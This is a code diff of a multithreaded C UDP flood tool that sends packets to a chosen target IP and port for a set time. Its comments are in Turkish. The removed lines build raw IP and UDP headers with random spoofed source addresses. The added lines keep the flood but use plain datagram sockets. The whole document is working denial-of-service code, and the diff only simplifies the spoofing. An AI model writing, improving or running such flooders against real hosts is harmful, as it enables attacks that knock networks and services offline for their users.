@@ -5,99 +5,31 @@
 #include <pthread.h>
 #include <arpa/inet.h>
 #include <time.h>
-#include <sys/socket.h>
-#include <netinet/ip.h>
-#include <netinet/udp.h>
-
-// IP ve UDP header boyutları
-#define IP_HDRLEN 20
-#define UDP_HDRLEN 8
 
 char *target_ip;
 int target_port, packet_size, thread_count, duration;
 
-// Basit checksum hesaplama fonksiyonu
-unsigned short checksum(unsigned short *ptr, int nbytes) {
-    long sum = 0;
-    unsigned short oddbyte;
-    while (nbytes > 1) {
-        sum += *ptr++;
-        nbytes -= 2;
-    }
-    if (nbytes == 1) {
-        oddbyte = 0;
-        *((unsigned char *)&oddbyte) = *(unsigned char *)ptr;
-        sum += oddbyte;
-    }
-    sum = (sum >> 16) + (sum & 0xffff);
-    sum += (sum >> 16);
-    return (unsigned short)(~sum);
-}
-
 void *flood(void *arg) {
-    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+    int sock = socket(AF_INET, SOCK_DGRAM, 0);
     if (sock < 0) {
-        perror("Raw socket oluşturulamadı");
+        perror("socket");
         pthread_exit(NULL);
     }
 
-    // IP başlıklarını kendimiz oluşturacağımız için
-    int one = 1;
-    const int *val = &one;
-    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
-        perror("IP_HDRINCL ayarlanamadı");
-        close(sock);
-        pthread_exit(NULL);
-    }
+    struct sockaddr_in target;
+    target.sin_family = AF_INET;
+    target.sin_port = htons(target_port);
+    target.sin_addr.s_addr = inet_addr(target_ip);
 
-    char *packet = malloc(IP_HDRLEN + UDP_HDRLEN + packet_size);
-    memset(packet, 0, IP_HDRLEN + UDP_HDRLEN + packet_size);
-
-    struct iphdr *iph = (struct iphdr *)packet;
-    struct udphdr *udph = (struct udphdr *)(packet + IP_HDRLEN);
-    char *data = packet + IP_HDRLEN + UDP_HDRLEN;
-
+    char *data = malloc(packet_size);
     memset(data, 'A', packet_size);
 
-    struct sockaddr_in sin;
-    sin.sin_family = AF_INET;
-    sin.sin_port = htons(target_port);
-    sin.sin_addr.s_addr = inet_addr(target_ip);
-
-    // IP header doldur
-    iph->ihl = 5;
-    iph->version = 4;
-    iph->tos = 0;
-    iph->tot_len = htons(IP_HDRLEN + UDP_HDRLEN + packet_size);
-    iph->id = htons(rand() % 65535);
-    iph->frag_off = 0;
-    iph->ttl = 255;
-    iph->protocol = IPPROTO_UDP;
-    iph->check = 0;
-    iph->saddr = inet_addr("192.168.1.100"); // Kaynak IP (spoof edilebilir)
-    iph->daddr = sin.sin_addr.s_addr;
-    iph->check = checksum((unsigned short *)iph, IP_HDRLEN);
-
-    // UDP header doldur
-    udph->source = htons(rand() % 65535);
-    udph->dest = htons(target_port);
-    udph->len = htons(UDP_HDRLEN + packet_size);
-    udph->check = 0;
-
-    time_t end_time = time(NULL) + duration;
-    while (time(NULL) < end_time) {
-        iph->id = htons(rand() % 65535); // Her pakette benzersiz ID
-        iph->saddr = htonl((rand() % 0xFFFFFF) | 0x0A000000); // Rastgele local kaynak IP
-        iph->check = 0;
-        iph->check = checksum((unsigned short *)iph, IP_HDRLEN);
-
-        udph->source = htons(rand() % 65535);
-
-        sendto(sock, packet, IP_HDRLEN + UDP_HDRLEN + packet_size, 0,
-               (struct sockaddr *)&sin, sizeof(sin));
+    time_t end = time(NULL) + duration;
+    while (time(NULL) < end) {
+        sendto(sock, data, packet_size, 0, (struct sockaddr *)&target, sizeof(target));
     }
 
-    free(packet);
+    free(data);
     close(sock);
     pthread_exit(NULL);
 }
